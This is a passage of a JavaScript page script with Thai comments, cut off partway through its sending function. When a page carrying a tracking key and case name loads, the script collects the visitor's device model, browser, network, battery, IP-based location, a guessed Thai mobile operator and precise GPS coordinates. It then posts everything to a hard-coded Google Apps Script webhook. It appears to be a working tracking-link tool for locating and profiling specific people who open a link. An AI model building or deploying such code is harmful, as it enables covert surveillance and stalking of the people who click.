// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า"; // ดึง case name ด้วย (ถ้ามี)

    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName); // Log caseName ด้วย

    return {
      trackingKey: trackingKey,
      caseName: caseName // คืนค่า caseName ด้วย
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  console.log("script.js execution started."); // *** เพิ่ม Log ***

  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // --- เพิ่มการตรวจสอบ trackingKey ก่อนดำเนินการต่อ ---
  if (!trackingKey || trackingKey === "ไม่มีค่า") {
      console.error("Invalid or missing tracking key. Halting script execution.");
      // อาจจะแสดงข้อความบนหน้าจอ หรือ redirect
      // document.body.innerHTML = "Access Denied: Invalid Tracking Key";
      return; // หยุดการทำงานของสคริปต์
  }
  console.log("Tracking key is present:", trackingKey);

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  console.log("Device Info:", deviceInfo);
  console.log("Connection Info:", connection);
  console.log("Browser Info:", browser);

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    console.log("Battery Info:", batteryData);
    // รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform, // ใช้ platform ที่ได้จาก deviceInfo
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};

    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
    Promise.all([
      getIPDetails().catch(error => {
          console.error("Error getting IP details:", error);
          return {ip: "ไม่สามารถระบุได้"};
      }),
      estimatePhoneNumber().catch(error => {
          console.error("Error estimating phone number:", error);
          return null;
      })
    ])
    .then(([ipData, phoneInfo]) => {
      console.log("IP Info:", ipData);
      console.log("Phone Info:", phoneInfo);

      // สร้าง requestId ที่นี่ ก่อนการขอตำแหน่ง
      const requestId = generateUniqueId(); // *** สร้าง ID ที่นี่ ***
      console.log("Generated Request ID:", requestId); // *** เพิ่ม Log ***

      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey, // ใช้ค่าที่ดึงมา
        caseName: caseName,     // ใช้ค่าที่ดึงมา
        useServerMessage: true, // ให้ Server สร้างข้อความแจ้งเตือน
        requestId: requestId    // ใช้ ID ที่สร้างไว้
      };

      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 15 วินาที
      if (navigator.geolocation) {
        console.log("Requesting geolocation...");
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              console.log("Geolocation success:", position.coords);
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=$${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.error(`Geolocation error: ${error.message} (Code: ${error.code})`);
              resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อเกิดข้อผิดพลาด
            },
            {
              timeout: 15000, // 15 วินาที
              enableHighAccuracy: true,
              maximumAge: 0
            }
          );
        });

        // รอข้อมูลพิกัดไม่เกิน 15 วินาที
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => {
            console.warn("Geolocation request timed out after 15 seconds.");
            resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อหมดเวลา
          }, 15000))
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;
          console.log("Final data to send (with location):", JSON.stringify(dataToSend));

          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        console.warn("Geolocation API is not supported in this browser.");
        dataToSend.location = "ไม่มีข้อมูล";
        console.log("Final data to send (no geolocation support):", JSON.stringify(dataToSend));
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  // สร้าง ID ที่คาดเดายากขึ้นเล็กน้อย
  const timestamp = Date.now().toString(36);
  const randomPart = Math.random().toString(36).substring(2, 10);
  return `req-${timestamp}-${randomPart}`;
}


// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";

  // ตัวแปรสำหรับเก็บข้อมูลละเอียด
  let deviceType = "คอมพิวเตอร์"; // ค่าเริ่มต้น
  let deviceModel = "ไม่สามารถระบุได้";
  let osInfo = "ไม่สามารถระบุได้";
  let deviceBrand = "ไม่สามารถระบุได้";

  // ตรวจจับ iPad อย่างถูกต้อง
  const isIPad = detectIPad();

  // ตรวจจับ Device Type
  if (isIPad) {
    deviceType = "แท็บเล็ต";
    deviceBrand = "Apple";
    deviceModel = getIPadModel(userAgent);
  } else if (/iPhone|iPod/.test(userAgent)) {
    deviceType = "มือถือ";
    deviceBrand = "Apple";
    deviceModel = getIPhoneModel(userAgent);
  } else if (/android/i.test(userAgent)) {
    // แยกระหว่างแท็บเล็ตและมือถือ Android
    if (/tablet|SM-T|Tab/i.test(userAgent) || (!/Mobile/i.test(userAgent) && Math.max(window.screen.width, window.screen.height) > 1000)) {
      deviceType = "แท็บเล็ต";
    } else {
      deviceType = "มือถือ";
    }

    // ดึงข้อมูลยี่ห้อและรุ่น Android
    const androidInfo = getAndroidInfo(userAgent);
    deviceBrand = androidInfo.brand;
    deviceModel = androidInfo.model;
    osInfo = androidInfo.osVersion; // osInfo จะมี "Android x.x"
  } else {
    // ตรวจจับ Desktop OS
    if (/Windows/.test(userAgent)) {
      deviceBrand = "PC";
      osInfo = getWindowsVersion(userAgent);
      deviceModel = `Windows ${osInfo}`; // ใช้ชื่อเวอร์ชัน Windows เป็น Model
    } else if (/Mac OS X/.test(userAgent)) {
      deviceBrand = "Apple";
      osInfo = getMacOSVersion(userAgent); // osInfo จะมีชื่อ macOS
      deviceModel = `Mac (${osInfo})`; // ใช้ชื่อ macOS ใน Model
    } else if (/Linux/.test(userAgent)) {
      deviceBrand = "PC";
      osInfo = "Linux"; // กำหนด OS เป็น Linux
      if (/Ubuntu/.test(userAgent)) {
        deviceModel = "Ubuntu Linux";
      } else if (/Fedora/.test(userAgent)) {
        deviceModel = "Fedora Linux";
      } else {
         deviceModel = "Linux Desktop"; // ค่าเริ่มต้นสำหรับ Linux อื่นๆ
      }
    } else if (/CrOS/.test(userAgent)) {
      deviceBrand = "Google";
      deviceModel = "Chromebook";
      osInfo = "Chrome OS";
      deviceType = "โน้ตบุ๊ค";
    }
  }

  // อัพเดทข้อมูล OS สำหรับอุปกรณ์ Apple ถ้ายังไม่ได้กำหนด
  if (deviceBrand === "Apple" && osInfo === "ไม่สามารถระบุได้") {
    if (isIPad || /iPhone|iPod/.test(userAgent)) {
      osInfo = getIOSVersion(userAgent);
    } else if (/Mac OS X/.test(userAgent)) {
      osInfo = getMacOSVersion(userAgent);
    }
  }

  // --- จัดรูปแบบ platform ให้สอดคล้องกัน ---
  // ให้ osInfo เก็บเวอร์ชัน OS โดยละเอียด
  // ให้ platform เก็บชื่อ OS หลัก (iOS, Android, Windows, macOS, Linux)
  let platformName = "ไม่ทราบ";
  if (osInfo.includes("iOS")) platformName = "iOS";
  else if (osInfo.includes("Android")) platformName = "Android";
  else if (osInfo.includes("Windows")) platformName = "Windows";
  else if (osInfo.includes("macOS") || osInfo.includes("Mac OS X")) platformName = "macOS";
  else if (osInfo.includes("Linux")) platformName = "Linux";
  else if (osInfo.includes("Chrome OS")) platformName = "Chrome OS";


  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    osInfo: osInfo, // เวอร์ชัน OS โดยละเอียด
    platform: platformName, // ชื่อ OS หลัก
    deviceBrand: deviceBrand
  };
}

// ฟังก์ชันตรวจสอบ iPad โดยเฉพาะ
function detectIPad() {
  const ua = navigator.userAgent;
  if (/iPad/.test(ua)) return true;
  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) return true; // iPadOS 13+
  // เพิ่มการตรวจสอบผ่าน platform API ถ้ามี
  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
  return false;
}

// ฟังก์ชันดึงข้อมูลรุ่น iPad
function getIPadModel(ua) {
  let model = "iPad";
  const iosVersion = getIOSVersion(ua); // ดึงเวอร์ชัน iOS
  // ตรรกะการระบุรุ่น iPad (อาจต้องอัปเดตตามรุ่นใหม่ๆ)
  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
  if (modelMatch) {
    const modelIdentifier = modelMatch[1];
    const ipadModels = {
        "11,3": "Air (3rd gen)", "11,4": "Air (3rd gen)",
        "13,1": "Air (4th gen)", "13,2": "Air (4th gen)",
        "14,3": "Air (5th gen)", "14,4": "Air (5th gen)",
        "11,1": "mini (5th gen)", "11,2": "mini (5th gen)",
        "14,1": "mini (6th gen)", "14,2": "mini (6th gen)",
        "11,6": "Pro 11\" (2nd gen)", "11,7": "Pro 11\" (2nd gen)",
        "12,1": "Pro 12.9\" (4th gen)", "12,2": "Pro 12.9\" (4th gen)",
        "13,4": "Pro 11\" (3rd gen)", "13,5": "Pro 11\" (3rd gen)", "13,6": "Pro 11\" (3rd gen)", "13,7": "Pro 11\" (3rd gen)",
        "13,8": "Pro 12.9\" (5th gen)", "13,9": "Pro 12.9\" (5th gen)", "13,10": "Pro 12.9\" (5th gen)", "13,11": "Pro 12.9\" (5th gen)",
        "14,5": "Pro 11\" (4th gen)", "14,6": "Pro 11\" (4th gen)",
        "14,7": "Pro 12.9\" (6th gen)", "14,8": "Pro 12.9\" (6th gen)",
        // เพิ่มรุ่นพื้นฐาน
        "11,6": " (8th gen)", "11,7": " (8th gen)",
        "12,1": " (9th gen)", "12,2": " (9th gen)",
        "13,18": " (10th gen)", "13,19": " (10th gen)",
    };
     model = ipadModels[modelIdentifier] ? `iPad ${ipadModels[modelIdentifier]}` : `iPad (ID: ${modelIdentifier})`;
  } else {
     // Fallback based on screen size if no identifier
     const screenSize = Math.max(window.screen.width, window.screen.height);
     if (screenSize >= 1366) model = "iPad Pro 12.9\"";
     else if (screenSize >= 1112) model = "iPad Pro 11\"/10.5\"";
     else if (screenSize >= 1024) model = "iPad/Air";
     else model = "iPad mini";
  }
  return `${model} (iOS ${iosVersion})`;
}

// ฟังก์ชันดึงข้อมูลรุ่น iPhone
function getIPhoneModel(ua) {
  let model = "iPhone";
  const iosVersion = getIOSVersion(ua); // ดึงเวอร์ชัน iOS
  // ตรรกะการระบุรุ่น iPhone (อาจต้องอัปเดต)
  const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
  if (modelMatch) {
      const modelIdentifier = modelMatch[1];
      const iphoneModels = {
          "14,7": "14", "14,8": "14 Plus", "15,2": "14 Pro", "15,3": "14 Pro Max",
          "15,4": "15", "15,5": "15 Plus", "16,1": "15 Pro", "16,2": "15 Pro Max",
          "14,6": "SE (3rd gen)",
          // เพิ่มรุ่นเก่าๆ หรือรุ่นอื่นๆ ตามต้องการ
      };
      model = iphoneModels[modelIdentifier] ? `iPhone ${iphoneModels[modelIdentifier]}` : `iPhone (ID: ${modelIdentifier})`;
  }
  return `${model} (iOS ${iosVersion})`;
}

// ฟังก์ชันดึงข้อมูลรุ่นเครื่องและระบบ Android
function getAndroidInfo(ua) {
  let brand = "Android";
  let model = "ไม่ทราบรุ่น";
  let osVersion = "ไม่ทราบเวอร์ชัน";

  // ดึงเวอร์ชัน Android
  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
  if (androidVersionMatch) {
    osVersion = androidVersionMatch[1];
  }

  // ตรวจสอบยี่ห้อและรุ่น (ปรับปรุง regex และ logic)
  let modelInfo = ua.substring(ua.indexOf('Build/')).split(';').pop().trim();
  modelInfo = modelInfo.substring(0, modelInfo.indexOf(')')).trim(); // เอาส่วนในวงเล็บสุดท้าย

  if (modelInfo && modelInfo.toLowerCase() !== "build") {
      model = modelInfo;
      // พยายามแยกแบรนด์
      const knownBrands = ["Samsung", "Xiaomi", "OPPO", "vivo", "HUAWEI", "HONOR", "OnePlus", "Google", "Realme", "Motorola", "Sony", "LG", "Asus"];
      for (const b of knownBrands) {
          if (ua.toLowerCase().includes(b.toLowerCase())) {
              brand = b;
              // ลบชื่อแบรนด์ออกจาก model ถ้าซ้ำ
              if (model.toLowerCase().startsWith(b.toLowerCase())) {
                  model = model.substring(b.length).trim();
              }
              break;
          }
      }
      // ถ้ายังเป็น Android และ model มีชื่อแบรนด์อยู่
      if (brand === "Android") {
          const modelParts = model.split(' ');
          if (modelParts.length > 0 && knownBrands.includes(modelParts[0])) {
              brand = modelParts[0];
              model = model.substring(brand.length).trim();
          }
      }
  } else {
      // Fallback หากวิธีแรกไม่ได้ผล
      const genericModelMatch = ua.match(/;\s*([^;]+?)\s*(?:Build|\))/i);
      if (genericModelMatch && genericModelMatch[1]) {
          model = genericModelMatch[1].trim();
          // แยกแบรนด์อีกครั้ง
          const knownBrands = ["Samsung", "Xiaomi", "OPPO", "vivo", "HUAWEI", "HONOR", "OnePlus", "Google", "Realme", "Motorola", "Sony", "LG", "Asus"];
           for (const b of knownBrands) {
              if (ua.toLowerCase().includes(b.toLowerCase())) {
                  brand = b;
                  if (model.toLowerCase().startsWith(b.toLowerCase())) {
                      model = model.substring(b.length).trim();
                  }
                  break;
              }
          }
      }
  }


  return {
    brand: brand,
    model: model,
    osVersion: `Android ${osVersion}`
  };
}


// ฟังก์ชันดึงเวอร์ชัน iOS
function getIOSVersion(ua) {
  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i);
  if (match) {
    return match[1].replace(/_/g, '.');
  }
  // Fallback for older formats or WebKit version
  const webkitMatch = ua.match(/Version\/([\d\.]+)/i);
  if (webkitMatch) return webkitMatch[1];
  return "ไม่ทราบเวอร์ชัน";
}

// ฟังก์ชันดึงเวอร์ชัน macOS
function getMacOSVersion(ua) {
  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
  if (match) {
    const version = match[1].replace(/_/g, '.');
    // แปลงเวอร์ชันตัวเลขเป็นชื่อ
    if (version.startsWith('14')) return "Sonoma";
    if (version.startsWith('13')) return "Ventura";
    if (version.startsWith('12')) return "Monterey";
    if (version.startsWith('11')) return "Big Sur";
    if (version.startsWith('10.15')) return "Catalina";
    if (version.startsWith('10.14')) return "Mojave";
    // เพิ่มเติมตามต้องการ
    return `macOS ${version}`;
  }
  return "macOS";
}

// ฟังก์ชันดึงเวอร์ชัน Windows
function getWindowsVersion(ua) {
  if (/Windows NT 10.0/.test(ua)) return "11/10";
  if (/Windows NT 6.3/.test(ua)) return "8.1";
  if (/Windows NT 6.2/.test(ua)) return "8";
  if (/Windows NT 6.1/.test(ua)) return "7";
  // เพิ่มเติมตามต้องการ
  return "เวอร์ชันเก่า";
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  let info = {
    type: "ไม่ทราบ", // e.g., 'wifi', 'cellular', 'ethernet'
    effectiveType: "ไม่ทราบ", // e.g., '4g', '3g', '2g', 'slow-2g'
    downlink: null, // Mbps
    rtt: null, // ms
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่ทราบ" // Simplified type: WiFi, Mobile Data, Ethernet, Other
  };

  if (connection) {
    info.type = connection.type || "ไม่ทราบ";
    info.effectiveType = connection.effectiveType || "ไม่ทราบ";
    info.downlink = connection.downlink || null;
    info.rtt = connection.rtt || null;
    info.saveData = connection.saveData || false;

    if (info.type === 'wifi') {
      info.isWifi = true;
      info.networkType = "WiFi";
    } else if (info.type === 'cellular') {
      info.isMobile = true;
      // ใช้ effectiveType เพื่อประมาณความเร็ว
      if (info.effectiveType.includes('4g') || info.effectiveType.includes('5g')) info.networkType = "4G/5G";
      else if (info.effectiveType.includes('3g')) info.networkType = "3G";
      else if (info.effectiveType.includes('2g')) info.networkType = "2G";
      else info.networkType = "Mobile Data";
    } else if (info.type === 'ethernet') {
       info.networkType = "Ethernet";
    } else if (info.type !== 'unknown' && info.type !== 'none' && info.type !== 'other') {
       info.networkType = info.type; // ใช้ type โดยตรงถ้าไม่ใช่ค่าทั่วไป
    } else {
       // ถ้า type ไม่ชัดเจน ลองเดาจาก effectiveType
       if (info.effectiveType.includes('4g')) info.networkType = "Fast (4G-like)";
       else if (info.effectiveType.includes('3g')) info.networkType = "Medium (3G-like)";
       else if (info.effectiveType.includes('2g')) info.networkType = "Slow (2G-like)";
    }
  }

  return info;
}


// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
      };
    }
    return { level: "ไม่รองรับ", charging: "ไม่รองรับ" };
  } catch (error) {
    console.error("Error getting battery info:", error);
    return { level: "ข้อผิดพลาด", charging: "ข้อผิดพลาด" };
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
    const ua = navigator.userAgent;
    let browserName = "ไม่ทราบ";
    let fullVersion = "ไม่ทราบ";
    let majorVersion = "ไม่ทราบ";
    let nameOffset, verOffset, ix;

    // --- ตรวจสอบ In-App Browsers ก่อน ---
    if (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) {
        browserName = "Facebook App";
    } else if (ua.indexOf("Instagram") > -1) {
        browserName = "Instagram App";
    } else if (ua.indexOf("Line") > -1) {
        browserName = "LINE App";
        verOffset = ua.indexOf("Line/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 5);
    } else if (ua.indexOf("Twitter") > -1) {
        browserName = "Twitter App";
    } else if (ua.indexOf("CriOS") > -1) { // Chrome on iOS
        browserName = "Chrome iOS";
        verOffset = ua.indexOf("CriOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6);
    } else if (ua.indexOf("FxiOS") > -1) { // Firefox on iOS
        browserName = "Firefox iOS";
        verOffset = ua.indexOf("FxiOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6);
    } else if (ua.indexOf("EdgiOS") > -1) { // Edge on iOS
        browserName = "Edge iOS";
        verOffset = ua.indexOf("EdgiOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 7);
    }
    // --- ตรวจสอบเบราว์เซอร์หลัก ---
    else if ((verOffset = ua.indexOf("Edg")) != -1) { // Microsoft Edge (Chromium)
        browserName = "Edge";
        fullVersion = ua.substring(verOffset + 4);
    } else if ((verOffset = ua.indexOf("SamsungBrowser")) != -1) { // Samsung Internet
        browserName = "Samsung Internet";
        fullVersion = ua.substring(verOffset + 15);
    } else if ((verOffset = ua.indexOf("OPR")) != -1 || (verOffset = ua.indexOf("Opera")) != -1) { // Opera
        browserName = "Opera";
        if (ua.indexOf("OPR") != -1) fullVersion = ua.substring(verOffset + 4);
        else fullVersion = ua.substring(verOffset + 6);
    } else if ((verOffset = ua.indexOf("Chrome")) != -1) { // Chrome (ต้องอยู่หลัง Edge และ Opera)
        browserName = "Chrome";
        fullVersion = ua.substring(verOffset + 7);
    } else if ((verOffset = ua.indexOf("Safari")) != -1) { // Safari (ต้องอยู่หลัง Chrome)
        browserName = "Safari";
        fullVersion = ua.substring(verOffset + 7);
        if ((verOffset = ua.indexOf("Version")) != -1)
            fullVersion = ua.substring(verOffset + 8);
    } else if ((verOffset = ua.indexOf("Firefox")) != -1) { // Firefox
        browserName = "Firefox";
        fullVersion = ua.substring(verOffset + 8);
    } else if ((nameOffset = ua.lastIndexOf(' ') + 1) < (verOffset = ua.lastIndexOf('/'))) { // Other browsers
        browserName = ua.substring(nameOffset, verOffset);
        fullVersion = ua.substring(verOffset + 1);
        if (browserName.toLowerCase() == browserName.toUpperCase()) {
            browserName = navigator.appName;
        }
    }

    // ตัดเวอร์ชันที่ไม่จำเป็นออก
    if ((ix = fullVersion.indexOf(";")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(" ")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(")")) != -1) fullVersion = fullVersion.substring(0, ix);

    majorVersion = parseInt('' + fullVersion, 10);
    if (isNaN(majorVersion)) {
        fullVersion = 'ไม่ทราบ';
        majorVersion = 'ไม่ทราบ';
    }

    // ตรวจสอบว่าเป็น WebView หรือไม่ (อาจไม่แม่นยำ 100%)
    let isWebView = (ua.indexOf("; wv") > -1) || // Android WebView
                    (ua.indexOf("iPhone") > -1 && ua.indexOf("Safari") === -1 && ua.indexOf("CriOS") === -1 && ua.indexOf("FxiOS") === -1) || // iOS WebView approximation
                    (browserName.includes("App")); // In-app browsers are WebViews

    return `${browserName} ${fullVersion}${isWebView ? ' (WebView)' : ''}`;
}


// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว
    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // ใส่ Token ถ้ามี
    if (!response.ok) {
        // ถ้า Token ไม่ถูกต้อง หรือมีปัญหา ลองแบบไม่มี Token
        console.warn(`ipinfo.io request with token failed (${response.status}), retrying without token.`);
        const responseNoToken = await fetch('https://ipinfo.io/json');
        if (!responseNoToken.ok) {
             throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
        }
        return await responseNoToken.json();
    }
    return await response.json();

  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    // Fallback ลองใช้ ip-api.com
    try {
        console.log("Trying fallback: ip-api.com");
        const fallbackResponse = await fetch('http://ip-api.com/json'); // ใช้ http เพื่อลดปัญหา CORS บางกรณี
        if (!fallbackResponse.ok) {
            throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
        }
        const fbData = await fallbackResponse.json();
        // แปลงข้อมูลจาก ip-api.com ให้มีโครงสร้างคล้าย ipinfo.io
        return {
            ip: fbData.query || "ไม่สามารถระบุได้",
            hostname: "ไม่มีข้อมูล (ip-api)", // ip-api ไม่มี hostname
            city: fbData.city || "ไม่ทราบ",
            region: fbData.regionName || "ไม่ทราบ",
            country: fbData.countryCode || "ไม่ทราบ",
            loc: fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล",
            org: fbData.org || "ไม่ทราบ",
            isp: fbData.isp || "ไม่ทราบ", // ip-api มี isp แยก
            asn: fbData.as ? fbData.as.split(' ')[0] : "ไม่ทราบ", // ip-api มี as
            postal: "ไม่มีข้อมูล (ip-api)",
            timezone: fbData.timezone || "ไม่ทราบ"
        };
    } catch (fallbackError) {
        console.error("ไม่สามารถดึง IP จาก fallback (ip-api.com) ได้:", fallbackError);
        // Fallback สุดท้าย: ipify.org (ได้แค่ IP)
        try {
            console.log("Trying final fallback: api.ipify.org");
            const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
            const finalFbData = await finalFallbackResponse.json();
            return { ip: finalFbData.ip || "ไม่สามารถระบุได้" };
        } catch (finalFallbackError) {
             console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError);
             return { ip: "ไม่สามารถระบุได้" };
        }
    }
  }
}


// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้", // ชื่อเครือข่ายที่อาจดึงได้จาก API อื่นๆ (ยากมาก)
    possibleOperator: "ไม่สามารถระบุได้", // ชื่อเครือข่ายที่คาดเดาจาก ISP
    countryCode: "ไม่สามารถระบุได้", // รหัสประเทศจาก IP
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรง" // หมายเหตุ
  };

  try {
    // 1. ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails(); // เรียกใช้ฟังก์ชันที่ปรับปรุงแล้ว

    // ใช้ข้อมูล ISP/Org จาก ipDetails
    const ispInfo = ipDetails.isp || ipDetails.org || "";

    // ตรวจสอบผู้ให้บริการในประเทศไทย
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP/Org
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }

    // 2. ดึงข้อมูลประเทศจาก IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country; // เก็บ Country Code (เช่น TH)
      // อาจจะแปลงเป็นรหัสโทรศัพท์ถ้าต้องการ เช่น +66 สำหรับ TH
    }

    // 3. ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? `(${phoneInfo.possibleOperator})` : "");
    } else if (connection && connection.type === 'wifi') {
       phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi";
    } else if (connection && connection.type === 'ethernet') {
       phoneInfo.remarks = "เชื่อมต่อผ่าน Ethernet";
    }


    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการข้อมูลโทรศัพท์ได้:", error);
    return phoneInfo; // คืนค่าเริ่มต้นถ้าเกิดข้อผิดพลาด
  }
}


// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxVUPrz4qwGHtHyJwMS4idEpB1AmnoSvojGy_J3ZJTMqF-XQNC4VTLBZlOeo0kDqgo/exec';

  // ตรวจสอบว่ามี requestId หรือไม่ ถ้าไม่มีให้สร้างใหม่
  if (!dataToSend.requestId) {
    console.warn("No requestId found in dataToSend, generating a new one.");
    dataToSend.requestId = generateUniqueId();
  }
  const currentRequestId = dataToSend.requestId;

  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำใน session ปัจจุบัน
  const sentKey = `sent_${currentRequestId}`;
  if (sessionStorage.getItem(sentKey)) {
    console.log(`DUPLICATE (Session Storage): ข้อมูลสำหรับ requestId ${currentRequestId} เคยส่งแล้วใน session นี้`);
    return; // ไม่ส่งซ้ำ
  }

  console.log(`กำลังส่งข้อมูลไป webhook (requestId: ${currentRequestId})`);
  console.log("Data:", JSON.stringify(dataToSend)); // Log ข้อมูลที่จะส่ง

  // ส่งข้อมูลด้วย fetch API
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      // 'Content-Type': 'application/json' // GAS doPost รับ text/plain ได้ดีกว่าเมื่อ parse JSON เอง
      'Content-Type': 'text/plain;charset=utf-8', // ส่งเป็น text/plain
    },
    body: JSON.stringify(dataToSend), // ส่งข้อมูลเป็น JSON string
    mode: 'no-cors' // ยังคงใช้ no-cors เพราะ GAS ไม่ได้ตั้งค่า CORS response มาตรฐาน
  })
  .then(() => {
    // เนื่องจากใช้ no-cors เราจะไม่ได้รับ response จริงๆ กลับมา
    // เรา assume ว่าการส่งสำเร็จถ้าไม่มี network error
    console.log(`ส่งข้อมูลไปยัง Server สำเร็จ (assumed success due to no-cors) - RequestId: ${currentRequestId}`);

    // บันทึกว่า requestId นี้ถูกส่งแล้วใน session นี้
    try {
        sessionStorage.setItem(sentKey, 'true');
        console.log(`บันทึก requestId ${currentRequestId} ลงใน sessionStorage`);
